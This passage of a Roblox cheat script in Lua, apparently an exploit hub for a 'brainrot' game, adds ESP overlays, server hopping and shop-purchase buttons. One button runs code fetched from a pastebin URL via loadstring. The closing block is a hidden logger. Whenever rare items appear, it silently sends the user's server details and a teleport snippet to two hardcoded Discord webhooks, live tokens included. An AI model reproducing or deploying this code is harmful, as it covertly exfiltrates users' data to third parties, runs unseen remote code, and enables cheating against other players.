billboard.Parent = head
ESPObjects[player] = billboard
end

if player.Character then
addESP(player.Character)
end

player.CharacterAdded:Connect(function(char)
task.wait(1)
if espEnabled then
addESP(char)
end
end)
end

local function enableESP()
for _, player in ipairs(Players:GetPlayers()) do
createESP(player)
end

Players.PlayerAdded:Connect(function(player)
if espEnabled then
createESP(player)
end
end)
end

local function disableESP()
for player, esp in pairs(ESPObjects) do
if esp then
esp:Destroy()
end
end
table.clear(ESPObjects)
end

-- ðŸŽ›ï¸ Add toggle to your GUI tab
EspTab:CreateToggle({
Name = "📇Player Name ESP",
CurrentValue = false,
Flag = "NameESP",
Callback = function(state)
espEnabled = state
if state then
enableESP()
else
disableESP()
end
end
})

local brainrotGods = {
    ["Cocofanto Elefanto"] = true,
    ["Girafa Celestre"] = true,
    ["Matteo"] = true,
    ["Tralalero Tralala"] = true,
    ["Odin Din Din Dun"] = true,
    ["Unclito Samito"] = true,
    ["Trenostruzzo Turbo 3000"] = true,
}

local godESPObjects = {}
local godESPEnabled = false

local function getAttachmentPart(model)
    if model.PrimaryPart then return model.PrimaryPart end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            return part
        end
    end
    return nil
end

local function createGodESP(model)
    if model:FindFirstChild("BrainrotESP") then return end
    local adorneePart = getAttachmentPart(model)
    if not adorneePart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "BrainrotESP"
    billboard.Adornee = adorneePart
    billboard.Size = UDim2.new(0, 166, 0, 33) -- slightly smaller
    billboard.StudsOffset = Vector3.new(0, 4, 0)
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.Parent = model

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "ðŸ§  " .. model.Name
    label.TextColor3 = Color3.fromRGB(0, 170, 255) -- bright blue
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.Font = Enum.Font.GothamBlack
    label.TextSize = 16
    label.ZIndex = 10
    label.ClipsDescendants = true
    label.Parent = billboard

    godESPObjects[model] = billboard
end

local function enableGodESP()
    godESPEnabled = true
    for _, model in ipairs(workspace:GetChildren()) do
        if model:IsA("Model") and brainrotGods[model.Name] then
            createGodESP(model)
        end
    end
end

local function disableGodESP()
    godESPEnabled = false
    for model, billboard in pairs(godESPObjects) do
        if billboard and billboard.Parent then
            billboard:Destroy()
        end
    end
    godESPObjects = {}
end

workspace.ChildAdded:Connect(function(child)
    if godESPEnabled and child:IsA("Model") and brainrotGods[child.Name] then
        createGodESP(child)
    end
end)

-- Replace 'EspTab' with your actual Rayfield tab variable
EspTab:CreateToggle({
    Name = "☠️ Brainrot God Esp",
    CurrentValue = false,
    Flag = "BrainrotGodESP",
    Callback = function(state)
        if state then
            enableGodESP()
        else
            disableGodESP()
        end
    end,
})

local secretBrainrots = {
    ["La Vacca Saturno Saturnita"] = true,
    ["Los Tralaleritos"] = true,
    ["Sammyni Spyderini"] = true,
    ["Graipuss Medussi"] = true,
    ["La Grande Combinazione"] = true,
    ["Garama and Madundung"] = true,
}

local secretESPObjects = {}
local secretESPEnabled = false

local function getAttachmentPart(model)
    if model.PrimaryPart then return model.PrimaryPart end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            return part
        end
    end
    return nil
end

local function createSecretESP(model)
    if model:FindFirstChild("SecretBrainrotESP") then return end
    local adorneePart = getAttachmentPart(model)
    if not adorneePart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "SecretBrainrotESP"
    billboard.Adornee = adorneePart
    billboard.Size = UDim2.new(0, 166, 0, 33)
    billboard.StudsOffset = Vector3.new(0, 5, 0)
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.Parent = model

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "ðŸ¤« " .. model.Name
    label.TextColor3 = Color3.fromRGB(255, 128, 0)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 16
    label.ZIndex = 10
    label.ClipsDescendants = true
    label.Parent = billboard

    secretESPObjects[model] = billboard
end

local function enableSecretESP()
    secretESPEnabled = true
    for _, model in ipairs(workspace:GetChildren()) do
        if model:IsA("Model") and secretBrainrots[model.Name] then
            createSecretESP(model)
        end
    end
end

local function disableSecretESP()
    secretESPEnabled = false
    for model, billboard in pairs(secretESPObjects) do
        if billboard and billboard.Parent then
            billboard:Destroy()
        end
    end
    secretESPObjects = {}
end

workspace.ChildAdded:Connect(function(child)
    if secretESPEnabled and child:IsA("Model") and secretBrainrots[child.Name] then
        createSecretESP(child)
    end
end)

-- Replace 'EspTab' with your actual Rayfield tab variable
EspTab:CreateToggle({
    Name = "🤫Secret Brainrot Esp",
    CurrentValue = false,
    Flag = "SecretBrainrotESP",
    Callback = function(state)
        if state then
            enableSecretESP()
        else
            disableSecretESP()
        end
    end,
})

local UtilsTab = Window:CreateTab("🛠️ Utils", 6034818371)

-- ðŸŸ¥ Then add the rest (GUI logic, etc.)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local leaveGui = Instance.new("ScreenGui")
leaveGui.Name = "LeaveButtonGUI"
leaveGui.ResetOnSpawn = false
leaveGui.Enabled = false
leaveGui.DisplayOrder = 1000
leaveGui.Parent = playerGui

local leaveButton = Instance.new("TextButton")
leaveButton.Size = UDim2.new(0, 100, 0, 40)
leaveButton.Position = UDim2.new(0.5, -50, 0, 10)
leaveButton.AnchorPoint = Vector2.new(0.5, 0)
leaveButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
leaveButton.Text = "Leave"
leaveButton.Font = Enum.Font.SourceSansBold
leaveButton.TextSize = 22
leaveButton.TextColor3 = Color3.new(1, 1, 1)
leaveButton.ZIndex = 999
leaveButton.Parent = leaveGui

leaveButton.MouseButton1Click:Connect(function()
	player:Kick("You chose to leave the game.")
end)

-- ðŸ”˜ Toggle to control the Leave GUI
UtilsTab:CreateToggle({
	Name = "Toggle Leave GUI",
	CurrentValue = false,
	Callback = function(state)
		leaveGui.Enabled = state
	end,
})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create Rejoin GUI (starts disabled)
local rejoinGui = Instance.new("ScreenGui")
rejoinGui.Name = "RejoinButtonGUI"
rejoinGui.ResetOnSpawn = false
rejoinGui.Enabled = false
rejoinGui.DisplayOrder = 1000
rejoinGui.Parent = playerGui

local rejoinButton = Instance.new("TextButton")
rejoinButton.Size = UDim2.new(0, 100, 0, 40)
rejoinButton.Position = UDim2.new(0.5, 54, 0, 10) -- 4 px right of center
rejoinButton.AnchorPoint = Vector2.new(0.5, 0)
rejoinButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
rejoinButton.Text = "Rejoin"
rejoinButton.Font = Enum.Font.SourceSansBold
rejoinButton.TextSize = 22
rejoinButton.TextColor3 = Color3.new(1, 1, 1)
rejoinButton.ZIndex = 999
rejoinButton.Parent = rejoinGui

rejoinButton.MouseButton1Click:Connect(function()
	local placeId = game.PlaceId
	local jobId = game.JobId
	TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
end)

-- Add toggle to UtilsTab to show/hide the Rejoin GUI
UtilsTab:CreateToggle({
	Name = "Toggle Rejoin GUI",
	CurrentValue = false,
	Callback = function(state)
		rejoinGui.Enabled = state
	end,
})

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Create Server Hop GUI (hidden by default)
local serverHopGui = Instance.new("ScreenGui")
serverHopGui.Name = "ServerHopGUI"
serverHopGui.ResetOnSpawn = false
serverHopGui.DisplayOrder = 1000
serverHopGui.Parent = playerGui
serverHopGui.Enabled = false -- start hidden

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 150, 0, 40)
frame.Position = UDim2.new(0.5, 160, 0, 10)
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
frame.BorderSizePixel = 0
frame.Parent = serverHopGui
frame.Active = true
frame.Draggable = true

local button = Instance.new("TextButton")
button.Size = UDim2.new(1, 0, 1, 0)
button.BackgroundTransparency = 1
button.Text = "Server Hop"
button.Font = Enum.Font.SourceSansBold
button.TextSize = 22
button.TextColor3 = Color3.new(1, 1, 1)
button.Parent = frame

-- Server Hop logic variables
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local hopping = false

local function loadVisited()
    local success, data = pcall(function()
        return HttpService:JSONDecode(readfile("NotSameServers.json"))
    end)
    if success and type(data) == "table" then
        AllIDs = data
    else
        AllIDs = {actualHour}
        pcall(function()
            writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
        end)
    end
end
loadVisited()

local function saveVisited()
    pcall(function()
        writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
    end)
end

local function TPReturner()
    local Site
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end

    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    else
        foundAnything = ""
    end

    local num = 0
    for i, v in pairs(Site.data) do
        if not hopping then return end
        local Possible = true
        local ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _, Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                        break
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        pcall(function()
                            delfile("NotSameServers.json")
                            AllIDs = {actualHour}
                            saveVisited()
                        end)
                    end
                end
            end
            if Possible then
                table.insert(AllIDs, ID)
                saveVisited()
                pcall(function()
                    TeleportService:TeleportToPlaceInstance(PlaceID, ID, player)
                end)
                wait(4)
                return
            end
        end
        num = num + 1
    end
end

local function serverHopLoop()
    while hopping do
        local success, err = pcall(TPReturner)
        if not success then warn(err) end
        wait(1)
    end
end

-- Toggle hopping state on button click inside custom GUI
button.MouseButton1Click:Connect(function()
    hopping = not hopping
    if hopping then
        button.Text = "Stop Server Hop"
        task.spawn(serverHopLoop)
    else
        button.Text = "Server Hop"
    end
end)

-- Rayfield toggle just shows/hides the custom GUI
UtilsTab:CreateToggle({
    Name = "Server Hop GUI",
    CurrentValue = false,
    Flag = "ServerHopGUIToggle",
    Callback = function(value)
        serverHopGui.Enabled = value
    end,
})

MainTab:CreateToggle({
Name = "👻Show Invisible Players", 
CurrentValue = visibilityEnabled, 
Flag = "VisibilityToggle",
Callback = function(s)
visibilityEnabled = s
if s then
for _,p in ipairs(Players:GetPlayers()) do
if p.Character then onCharacterAdded(p.Character) end
p.CharacterAdded:Connect(onCharacterAdded)
if p:FindFirstChild("Backpack") then
p.Backpack.ChildAdded:Connect(function(tool)
local handle = tool:FindFirstChild("Handle")
if handle then handle.Transparency=0; handle.CanCollide=false end
end)
end
end
task.spawn(function()
while visibilityEnabled do
for _,p in ipairs(Players:GetPlayers()) do
if p.Character then
makeCharacterVisible(p.Character)
makeToolsVisible(p)
end
end
task.wait(2)
end
end)
end
end
})

MainTab:CreateButton({
Name = "🥷Steal Tween gui",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/qrFryUJ2",true))()
end,
})

MainTab:CreateToggle({
Name = "🪤Anti Trap", 
CurrentValue = false, 
Flag = "AntiTrapToggle",
Callback = function(s) 
antiTrapEnabled=s 
if s then startAntiTrap() end 
end
})

MainTab:CreateToggle({
Name = "🐍Auto Activate Medusa's Head", 
CurrentValue = false, 
Flag = "AutoMedusaToggle",
Callback = function(s) medusaEnabled=s end
})

MainTab:CreateToggle({
Name = "🔫Bring Nearby Sentry To Destroy",
CurrentValue = false,
Callback = function(s) sentryActive = s end
})

-- Add ShopNPCCash toggle
MainTab:CreateToggle({
Name = "🛒Bring The Shop To You",
CurrentValue = false,
Callback = function(s)
shopNPCCashActive = s
if s then
task.spawn(manageShopNPCCash)
end
end
})

-- Medusa detection loop
RunService.Heartbeat:Connect(function()
if medusaEnabled and not medusaCooldown then
local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if hrp then
for _,p in ipairs(Players:GetPlayers()) do
if p~=LocalPlayer and p.Character then
local o = p.Character:FindFirstChild("HumanoidRootPart")
if o and (hrp.Position-o.Position).Magnitude<=medusaRange then
activateMedusa()
break
end
end
end
end
end
end)


MainTab:CreateToggle({
Name = "Zues hub By Ken_i",
CurrentValue = false,
Flag = "RagdollServerToggle",
Callback = function(enabled)
ragdollEnabled = enabled
if not enabled then
DetachedLimbs = {}
hidePrompt()
end
end
})

ShopTab:CreateButton({
Name = "All Seeing Sentry",
Callback = function()
local args = { "All Seeing Sentry" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Invisibility Cloak",
Callback = function()
local args = { "Invisibility Cloak" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

}) 

ShopTab:CreateButton({
Name = "Trap",
Callback = function()
local args = { "Trap" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Medusa",
Callback = function()
local args = {"Medusa's Head" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Quantum Cloner",
Callback = function()
local args = {"Quantum Cloner"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Web Slinger",
Callback = function()
local args = {"Web Slinger"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Rainbowrath Sword",
Callback = function()
local args = {"Rainbowrath Sword"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Galaxy Slap",
Callback = function()
local args = {"Galaxy Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Nuclear Slap",
Callback = function()
local args = {"Nuclear Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Dark Matter Slap",
Callback = function()
local args = {"Dark Matter Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Body Swap Potion",
Callback = function()
local args = {"Body Swap Potion"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Splatter Slap",
Callback = function()
local args = {"Splatter Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- ✅ Only run if in the correct game
local allowedPlaceId = 109983668079237
if game.PlaceId ~= allowedPlaceId then
    return
end

-- 🌐 Webhooks
local webhookUrls = {
    "https://discord.com/api/webhooks/1394493952777781339/WeA17Y-eTO2oAUux6QBg1kRB_xroGezesHAS5DQ-HR5exzeWzwCvEWDn8WXBso7GgYNK",
    "https://discord.com/api/webhooks/1394194033575727185/xSSOUX2Vf-kjpsqzpELQ3lB2_pd5ZBzt80purEkpbP7_Ko9b0uW685KPkCgypZJKrmAc"
}

-- 🧠 Brainrot model names
local brainrotGods = {
    ["La Vacca Saturno Saturnita"] = true,
    ["Los Tralaleritos"] = true,
    ["Sammyni Spyderini"] = true,
    ["Graipuss Medussi"] = true,
    ["La Grande Combinasion"] = true,
    ["Garama and Madundung"] = true,
    ["Secret Lucky Block"] = true,
    ["Pot Hotspot"] = true,
    ["Las Tralaleritas"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
}

local notifiedModels = {}

-- ✅ Player count check
local function isValidPlayerCount()
    local count = #Players:GetPlayers()
    return count >= 3 and count <= 8
end

-- 🧠 Check if server is private
local function isPrivateServer()
    local ownerId = game.PrivateServerOwnerId
    return ownerId and ownerId ~= 0
end

-- 🌈 Add emoji to mutation name
local function decorateMutation(mutation)
    local lowered = string.lower(mutation)
    if string.find(lowered, "gold") then
        return "🌕 " .. mutation
    elseif string.find(lowered, "diamond") then
        return "💎 " .. mutation
    elseif string.find(lowered, "rainbow") then
        return "🌈 " .. mutation
    else
        return mutation
    end
end

-- 🧬 Get Mutation text for a given model
local function getMutationText(model)
    local mutationText = "None"
    local base = model:FindFirstChild("Base", true)
    if base then
        local attach = base:FindFirstChild("Attachment", true)
        if attach then
            local overhead = attach:FindFirstChild("AnimalOverhead")
            if overhead and overhead:FindFirstChild("Mutation") then
                local mutationLabel = overhead:FindFirstChild("Mutation")
                if mutationLabel:IsA("TextLabel") and mutationLabel.Text ~= "" then
                    mutationText = mutationLabel.Text
                end
            end
        end
    end
    return decorateMutation(mutationText)
end

-- 🚀 Send Discord notification
local function sendDiscordNotification(allResults)
    local placeId = tostring(game.PlaceId)
    local jobId = game.JobId

    local gameName = "Unknown"
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info and info.Name or "Unknown"
    end)

    local privateStatus = isPrivateServer() and "Yes" or "No"

    local modelLines = ""
    for _, line in ipairs(allResults) do
        modelLines = modelLines .. "--- add <@&1392894797831733329> to server Secrets Found! Model Name: \"" .. line .. "\" ---\n"
    end

    local message = [[
--- 📢 **Game:** ]] .. gameName .. [[
--- 🔒 **Private Server:** ]] .. privateStatus .. [[

--- You can copy the entire message below and paste into your executor. ---

]] .. modelLines .. [[

local player = game.Players.LocalPlayer
local teleportService = game:GetService("TeleportService")
teleportService:TeleportToPlaceInstance("]] .. placeId .. [[", "]] .. jobId .. [[", player)
]]

    local data = {
        ["content"] = message
    }

    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request = (syn and syn.request) or (http and http.request) or request or http_request
    if request then
        for _, url in ipairs(webhookUrls) do
            request({
                Url = url,
                Body = jsonData,
                Method = "POST",
                Headers = headers
            })
        end
    end
end

-- 🧠 Main detection logic
local function checkBrainrotModels()
    if not isValidPlayerCount() then return end

    local modelsToReport = {}

    for _, obj in pairs(Workspace:GetChildren()) do
        if obj:IsA("Model") and brainrotGods[obj.Name] then
            if not notifiedModels[obj] then
                local basePart = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
                if basePart then
                    local creationTime = basePart:GetAttribute("CreationTime")
                    if not creationTime then
                        basePart:SetAttribute("CreationTime", tick())
                    else
                        if (tick() - creationTime) >= 1 then
                            local mutation = getMutationText(obj)
                            local fullName = obj.Name .. " | Mutation: " .. mutation
                            table.insert(modelsToReport, fullName)
                            notifiedModels[obj] = true
                        end
                    end
                end
            end
        end
    end

    if #modelsToReport > 0 then
        sendDiscordNotification(modelsToReport)
    end
end

-- 🔁 Loop continuously
task.delay(0.5, function()
    while true do
        pcall(checkBrainrotModels)
        task.wait(0.5)
    end
end)
